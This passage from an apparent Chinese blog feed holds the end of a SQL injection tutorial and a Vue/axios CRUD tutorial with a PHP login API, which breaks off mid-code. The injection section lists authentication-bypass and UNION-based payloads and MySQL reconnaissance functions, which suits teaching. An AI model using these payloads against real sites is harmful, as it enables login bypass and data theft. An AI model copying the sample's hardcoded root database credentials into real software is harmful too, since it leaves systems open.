脚本并解析。</p><p>脚本连接位于数据访问层的 DBMS（数据库管理系统），并执行 Sql 语句。</p><p>数据访问层的数据库管理系统返回 Sql 语句执行结果给 Web 服务器。</p><p>业务逻辑层的 Web 服务器将 Web 页面封装成 HTML 格式发送给表示层的 Web 浏览器。</p><p>表示层的 Web 浏览器解析 HTML 文件，将内容展示给用户。</p><p>在三层架构中，所有通信都必须要经过中间层，简单地说，三层架构是一种线性关系。</p><ol start="2"><li><h2 id="SQL注入概念及产生原因："><a href="#SQL注入概念及产生原因：" class="headerlink" title="SQL注入概念及产生原因："></a>SQL注入概念及产生原因：</h2></li></ol><h3 id="2-1-数据可控"><a href="#2-1-数据可控" class="headerlink" title="2.1 数据可控"></a>2.1 数据可控</h3><pre><code> 当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</code></pre><h3 id="2-2-关于数据库"><a href="#2-2-关于数据库" class="headerlink" title="2.2 关于数据库"></a>2.2 关于数据库</h3><ul><li>​在MySQL5.0版本后，MySQL默认正在数据库重存放一个information_schema的数据库，在该库中，我们需要记住三个表名，分别是schemata，tables，columns。</li><li>​    Schemata表存储的是该用户创建的所有数据库的库名，需要记住该表中记录数据库名的字段名为schema_name。</li><li>​    Tables表鵆该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表明的字段分别是table_schema 和 table_name。</li><li>​    Columns表存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表明、字段名为table_schema、table_name、columns_name。</li></ul><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223184105628.png" alt="image-20231223184105628"></p><h3 id="2-3-SQL注入的条件"><a href="#2-3-SQL注入的条件" class="headerlink" title="2.3 SQL注入的条件"></a>2.3 SQL注入的条件</h3><p><strong>SQL注入</strong> 是一种常见的网络攻击技术，它主要发生在两个条件满足时：</p><ol><li><strong>用户可控制数据输入：</strong> 攻击者可以通过表单、URL参数、Cookie等方式向网站提交数据。</li><li><strong>代码与用户输入拼接：</strong> 网站在处理用户输入时，将这些输入直接与SQL语句拼接，然后在数据库上执行这个拼接后的语句。</li></ol><h2 id="3-SQL注入的本质"><a href="#3-SQL注入的本质" class="headerlink" title="3. SQL注入的本质"></a>3. SQL注入的本质</h2><p>SQL注入攻击的本质是 <strong>违反了数据与代码分离的原则</strong>。这意味着，用户输入的数据被错误地当作了代码来执行。在一个安全的系统中，用户的数据应该始终被当作数据处理，而不是代码。</p><h2 id="4-SQL注入的两个关键点"><a href="#4-SQL注入的两个关键点" class="headerlink" title="4. SQL注入的两个关键点"></a>4. SQL注入的两个关键点</h2><p>SQL注入攻击通常涉及以下两个关键点：</p><ol><li><strong>用户能够控制输入内容：</strong> 用户有机会输入或修改发送到服务器的数据。</li><li><strong>Web应用将用户输入带入数据库执行：</strong> 应用程序不恰当地将用户输入作为SQL命令的一部分执行，而没有进行适当的清理或转义。</li></ol><h2 id="5-SQL注入的基本危害"><a href="#5-SQL注入的基本危害" class="headerlink" title="5.SQL注入的基本危害"></a>5.SQL注入的基本危害</h2><p>SQL注入攻击可能导致多种安全问题，包括但不限于：</p><ol><li><strong>盗取网站的敏感信息：</strong> 例如用户数据、密码、私人信息等。</li><li><strong>绕过网站后台认证：</strong> 例如，使用万能密码（比如 <code>&#39;or &#39;1&#39; = &#39;1&#39; #</code>）登录到网站的管理界面。</li><li><strong>提权获取系统权限：</strong> 利用SQL注入漏洞，攻击者可能提升自己的权限，访问或修改更敏感的数据。</li><li><strong>读取文件信息：</strong> 访问或修改服务器上的文件。</li></ol><h2 id="6-MYSQL数据库注入-常用函数"><a href="#6-MYSQL数据库注入-常用函数" class="headerlink" title="6.MYSQL数据库注入 - 常用函数"></a>6.MYSQL数据库注入 - 常用函数</h2><p>在进行SQL注入时，以下MySQL函数经常被用来收集信息：</p><ol><li><p><code>user()</code>：返回当前数据库的用户，即网站配置文件中用于连接数据库的账号。</p></li><li><p><code>version()</code>：返回数据库的版本。</p></li><li><p><code>database()</code>：返回当前使用的数据库名称。</p></li><li><p><code>group_concat()</code>：将数据库中的多个记录合并为一个字符串。</p></li><li><p><code>@@datadir</code>：显示数据库的存储路径。</p></li><li><p><code>@@version_compile_os</code>：显示操作系统的版本。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231223184427548.png" alt="image-20231223184427548"></p></li></ol><h2 id="7-SQL（联合）注入流程"><a href="#7-SQL（联合）注入流程" class="headerlink" title="7.SQL（联合）注入流程"></a>7.SQL（联合）注入流程</h2><p>一个典型的SQL联合注入流程可能包括以下步骤：</p><ol><li><strong>判断是否需要闭合：</strong> 通过在URL参数中添加 <code>and 1=1</code> 和 <code>and 1=2</code>，判断结果是否有差异。如果没有差异，则可能需要用 <code>--+</code> 进行闭合。</li><li><strong>猜解字段数：</strong> 使用 <code>ORDER BY</code> 语句（如 <code>order by 10</code>）来猜测返回记录的字段数。</li><li><strong>判断数据回显位置：</strong> 使用 <code>UNION SELECT</code> 语句，如 <code>-1 UNION SELECT 1, 2, 3, 4, 5...</code>，来找出哪些字段被回显到页面上。</li><li><strong>获取当前数据库名、用户和版本：</strong> 使用类似 <code>UNION SELECT version(), database(), user(), 4...</code> 的语句。</li><li><strong>获取所有数据库名：</strong> 进一步利用SQL注入来获取服务器上所有数据库的名称。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&quot;Sql注入简介&quot;&gt;&lt;a href=&quot;#Sql注入简介&quot; class=&quot;headerlink&quot; title=&quot;Sql注入简介&quot;&gt;&lt;/a&gt;Sql注入简介&lt;/h2&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>Vue 数据绑定与axios传参</title>
    <link href="http://example.com/2023/12/23/Vue%20%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E4%B8%8E%E4%BA%A4%E4%BA%92%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2023/12/23/Vue%20%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E4%B8%8E%E4%BA%A4%E4%BA%92%E7%AC%94%E8%AE%B0/</id>
    <published>2023-12-23T06:26:28.670Z</published>
    <updated>2023-12-23T12:44:44.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vue-数据绑定与交互"><a href="#Vue-数据绑定与交互" class="headerlink" title="Vue 数据绑定与交互"></a>Vue 数据绑定与交互</h1><h2 id="1-Vue-js-基础"><a href="#1-Vue-js-基础" class="headerlink" title="1. Vue.js 基础"></a>1. Vue.js 基础</h2><p>Vue.js 是一个用于构建用户界面的JavaScript框架。它提供了一种简洁的方式来创建响应式的数据绑定和组合的视图组件。Vue的核心是一个响应式的数据绑定系统。</p><h2 id="2-数据绑定"><a href="#2-数据绑定" class="headerlink" title="2. 数据绑定"></a>2. 数据绑定</h2><h3 id="1-插值表达式"><a href="#1-插值表达式" class="headerlink" title="(1) 插值表达式"></a>(1) 插值表达式</h3><ul><li><strong>使用方法</strong>：在模板中，可以使用双大括号 <code>&#123;&#123; &#125;&#125;</code> 来展示JavaScript表达式的值。</li><li><strong>示例</strong>：<code>&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;</code></li></ul><h3 id="2-v-bind"><a href="#2-v-bind" class="headerlink" title="(2) v-bind"></a>(2) v-bind</h3><ul><li><p><strong>目的</strong>：用于动态地绑定一个或多个特性，或一个组件 prop 到表达式。</p></li><li><p><strong>简写</strong>：<code>:特性名=&quot;表达式&quot;</code></p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;img v-bind:src=&quot;imageSrc&quot; /&gt;</span><br><span class="line">&lt;!-- 简写 --&gt;</span><br><span class="line">&lt;img :src=&quot;imageSrc&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-事件处理"><a href="#3-事件处理" class="headerlink" title="3. 事件处理"></a>3. 事件处理</h2><h3 id="1-v-on"><a href="#1-v-on" class="headerlink" title="(1) v-on"></a>(1) v-on</h3><ul><li><p><strong>用途</strong>：用于监听 DOM 事件，并在触发时执行一些JavaScript代码。</p></li><li><p><strong>简写</strong>：<code>@事件名=&quot;方法&quot;</code></p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code&lt;button v-on:click=&quot;clickHandler&quot;&gt;Click me&lt;/button&gt;</span><br><span class="line">&lt;!-- 简写 --&gt;</span><br><span class="line">&lt;button @click=&quot;clickHandler&quot;&gt;Click me&lt;/button&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-方法实现"><a href="#2-方法实现" class="headerlink" title="(2) 方法实现"></a>(2) 方法实现</h3><ul><li><p>Vue 实例中：定义一个名为 <code>clickHandler</code>的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy codenew Vue(&#123;</span><br><span class="line">  methods: &#123;</span><br><span class="line">    clickHandler() &#123;</span><br><span class="line">      // 事件处理逻辑</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="4-双向数据绑定"><a href="#4-双向数据绑定" class="headerlink" title="4. 双向数据绑定"></a>4. 双向数据绑定</h2><h3 id="1-v-model"><a href="#1-v-model" class="headerlink" title="(1) v-model"></a>(1) v-model</h3><ul><li><p><strong>目的</strong>：在表单元素上创建双向数据绑定。</p></li><li><p><strong>适用元素</strong>：<code>&lt;input&gt;</code>, <code>&lt;select&gt;</code>, <code>&lt;textarea&gt;</code>等。</p></li><li><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">htmlCopy code</span><br><span class="line">&lt;input v-model=&quot;message&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-CRUD-操作示例"><a href="#5-CRUD-操作示例" class="headerlink" title="5. CRUD 操作示例"></a>5. CRUD 操作示例</h2><h3 id="1-Create-创建"><a href="#1-Create-创建" class="headerlink" title="(1) Create (创建)"></a>(1) Create (创建)</h3><h4 id="SQL-示例"><a href="#SQL-示例" class="headerlink" title="SQL 示例"></a>SQL 示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">INSERT INTO <span class="title function_ invoke__">users</span> (username, email) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;johndoe&#x27;</span>, <span class="string">&#x27;john@example.com&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="Vue-示例"><a href="#Vue-示例" class="headerlink" title="Vue 示例"></a>Vue 示例</h4><p>假设我们正在创建一个用户。在 Vue 应用中，您可能会有一个表单来收集用户信息，并使用 Axios 发送 POST 请求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// Vue 方法</span></span><br><span class="line">methods: &#123;</span><br><span class="line">  <span class="title function_ invoke__">createUser</span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">userData</span> = &#123;</span><br><span class="line">      username: this.username,</span><br><span class="line">      email: this.email</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    axios.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;https://api.example.com/users&#x27;</span>, userData)</span><br><span class="line">      .<span class="title function_ invoke__">then</span>(response =&gt; &#123;</span><br><span class="line">        console.<span class="title function_ invoke__">log</span>(<span class="string">&#x27;User created:&#x27;</span>, response.data);</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="keyword">catch</span>(error =&gt; &#123;</span><br><span class="line">        console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Error creating user:&#x27;</span>, error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Read-读取"><a href="#2-Read-读取" class="headerlink" title="(2) Read (读取)"></a>(2) Read (读取)</h3><h4 id="SQL-示例-1"><a href="#SQL-示例-1" class="headerlink" title="SQL 示例"></a>SQL 示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">SELECT username, email FROM users WHERE id = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="Vue-示例-1"><a href="#Vue-示例-1" class="headerlink" title="Vue 示例"></a>Vue 示例</h4><p>要获取用户信息，可以发送 GET 请求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// Vue 方法</span></span><br><span class="line">methods: &#123;</span><br><span class="line">  <span class="title function_ invoke__">fetchUser</span>() &#123;</span><br><span class="line">    axios.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;https://api.example.com/users/1&#x27;</span>)</span><br><span class="line">      .<span class="title function_ invoke__">then</span>(response =&gt; &#123;</span><br><span class="line">        this.user = response.data;</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="keyword">catch</span>(error =&gt; &#123;</span><br><span class="line">        console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Error fetching user:&#x27;</span>, error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-Update-更新"><a href="#3-Update-更新" class="headerlink" title="(3) Update (更新)"></a>(3) Update (更新)</h3><h4 id="SQL-示例-2"><a href="#SQL-示例-2" class="headerlink" title="SQL 示例"></a>SQL 示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">UPDATE users SET email = <span class="string">&#x27;newemail@example.com&#x27;</span> WHERE id = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="Vue-示例-2"><a href="#Vue-示例-2" class="headerlink" title="Vue 示例"></a>Vue 示例</h4><p>对于更新操作，可以使用 PUT 或 PATCH 请求，通常 PUT 用于整个资源的更新，而 PATCH 用于部分更新。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// Vue 方法</span></span><br><span class="line">methods: &#123;</span><br><span class="line">  <span class="title function_ invoke__">updateUser</span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">updatedData</span> = &#123;</span><br><span class="line">      email: <span class="string">&#x27;newemail@example.com&#x27;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    axios.<span class="title function_ invoke__">patch</span>(<span class="string">&#x27;https://api.example.com/users/1&#x27;</span>, updatedData)</span><br><span class="line">      .<span class="title function_ invoke__">then</span>(response =&gt; &#123;</span><br><span class="line">        console.<span class="title function_ invoke__">log</span>(<span class="string">&#x27;User updated:&#x27;</span>, response.data);</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="keyword">catch</span>(error =&gt; &#123;</span><br><span class="line">        console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Error updating user:&#x27;</span>, error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Delete-删除"><a href="#4-Delete-删除" class="headerlink" title="(4) Delete (删除)"></a>(4) Delete (删除)</h3><h4 id="SQL-示例-3"><a href="#SQL-示例-3" class="headerlink" title="SQL 示例"></a>SQL 示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">DELETE FROM users WHERE id = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="Vue-示例-3"><a href="#Vue-示例-3" class="headerlink" title="Vue 示例"></a>Vue 示例</h4><p>删除操作通常通过发送 DELETE 请求来实现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy code<span class="comment">// Vue 方法</span></span><br><span class="line">methods: &#123;</span><br><span class="line">  <span class="title function_ invoke__">deleteUser</span>() &#123;</span><br><span class="line">    axios.<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;https://api.example.com/users/1&#x27;</span>)</span><br><span class="line">      .<span class="title function_ invoke__">then</span>(response =&gt; &#123;</span><br><span class="line">        console.<span class="title function_ invoke__">log</span>(<span class="string">&#x27;User deleted:&#x27;</span>, response.data);</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="keyword">catch</span>(error =&gt; &#123;</span><br><span class="line">        console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Error deleting user:&#x27;</span>, error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这些示例中，我们使用了 Axios 作为 HTTP 客户端来发送请求。这些请求假设与一个 API 交互，该 API 提供用户数据的 CRUD 操作。在实际应用中，API 的 URL 和所需的数据结构可能有所不同。</p><h3 id="登录页面"><a href="#登录页面" class="headerlink" title="登录页面"></a>登录页面</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">     &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./index.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./vue.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./index.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login1</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login2</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">i</span> <span class="title">class</span>=&quot;<span class="title">el</span>-<span class="title">icon</span>-<span class="title">loading</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span>&gt;图书馆系统&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">input</span> <span class="title">placeholder</span>=&quot;请输入用户名&quot; <span class="title">v</span>-<span class="title">model</span>=&quot;<span class="title">userData</span>.<span class="title">username</span>&quot; <span class="title">clearable</span>&gt;&lt;/<span class="title">el</span>-<span class="title">input</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">input</span> <span class="title">placeholder</span>=&quot;请输入密码&quot; <span class="title">v</span>-<span class="title">model</span>=&quot;<span class="title">userData</span>.<span class="title">password</span>&quot; <span class="title">clearable</span> <span class="title">show</span>-<span class="title">password</span>&gt;&lt;/<span class="title">el</span>-<span class="title">input</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">primary</span>&quot; @<span class="title">click</span>=&quot;<span class="title">login</span>&quot;&gt;登录&lt;/<span class="title">el</span>-<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">success</span>&quot; @<span class="title">click</span>=&quot;<span class="title">goToRegister</span>&quot;&gt;注册&lt;/<span class="title">el</span>-<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">       &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"> &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"> &lt;<span class="title">style</span>&gt;</span></span><br><span class="line"><span class="class">        .<span class="title">el</span>-<span class="title">icon</span>-<span class="title">loading</span> </span>&#123;</span><br><span class="line">            font-size: <span class="number">100</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: <span class="number">20</span>vh;</span><br><span class="line">            width: <span class="number">20</span>vw;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login1 &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">            align-items: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">            el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">            data: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    userData: &#123;</span><br><span class="line">                        username: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                        password: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                login: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    axios.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://localhost/api.php&#x27;</span>, this.userData)</span><br><span class="line">                        .<span class="title function_ invoke__">then</span>((response) =&gt; &#123;</span><br><span class="line">                            <span class="keyword">const</span> <span class="variable constant_">data</span> = response.data;</span><br><span class="line">                            <span class="keyword">if</span> (data.status === <span class="string">&#x27;success&#x27;</span>) &#123;</span><br><span class="line">                                sessionStorage.<span class="title function_ invoke__">setItem</span>(<span class="string">&#x27;user&#x27;</span>, JSON.<span class="title function_ invoke__">stringify</span>(data.user));</span><br><span class="line">                                window.location.href = <span class="string">&quot;http://localhost/2.php&quot;</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.status === <span class="string">&#x27;zhuye&#x27;</span>) &#123;</span><br><span class="line">                                <span class="comment">// 特殊处理管理员登录</span></span><br><span class="line">                                window.location.href = <span class="string">&quot;http://localhost/3.php&quot;</span>; <span class="comment">// 更改为您的管理员页面</span></span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                this.<span class="variable">$notify</span>.<span class="title function_ invoke__">error</span>(&#123;</span><br><span class="line">                                    <span class="attr">title</span>: <span class="string">&#x27;错误&#x27;</span>,</span><br><span class="line">                                    <span class="attr">message</span>: <span class="string">&#x27;账号密码错误&#x27;</span></span><br><span class="line">                                &#125;);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;).<span class="keyword">catch</span>((error) =&gt; &#123;</span><br><span class="line">                            console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;请求失败：&#x27;</span>, error);</span><br><span class="line">                        &#125;);</span><br><span class="line">                &#125;,</span><br><span class="line">                goToRegister: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    window.location.href = <span class="string">&#x27;register.php&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="登录验证api"><a href="#登录验证api" class="headerlink" title="登录验证api"></a>登录验证api</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;security&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_set_charset</span>(<span class="variable">$conn</span>, <span class="string">&quot;utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]; <span class="comment">// 